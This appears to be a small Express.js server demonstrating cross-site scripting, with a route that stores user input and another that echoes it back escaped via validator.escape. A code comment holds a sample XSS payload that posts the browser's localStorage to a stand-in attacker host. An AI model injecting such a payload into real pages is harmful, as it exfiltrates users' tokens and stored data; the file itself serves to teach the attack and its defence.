const express = require("express");
const validator = require("validator");
const app = express();
const db = {
  userComments: "",
};

app.use(express.json());

// Server that responds with static files. Connect with Chrome!
app.get("/index", (req, resp) => {
  resp.sendFile("index.html", { root: __dirname });
});

app.get("/hacked", (req, resp) => {
  console.log("GET /hacked", db.userComments);
  resp.send(`welcome, ${validator.escape(db.userComments)}`);
});

app.post("/index", (req, resp) => {
  console.log("Hit");
  resp.sendFile("index.html", { root: __dirname });
});

/* 
https://jsonplaceholder.typicode.com/posts
<script>
  fetch('https://hackers-server.com', {
    method: "POST",
    body: JSON.stringify(localStorage)
  })
</script>
*/
app.get("/post", (req, resp) => {
  resp.setHeader("Content-Type", "text/html");

  db.userComments = req.query.input;
  resp.send(`Your request has been received successfully.`);
});

app.listen(3000, () => {
  console.log("server is up on port 3000");
});
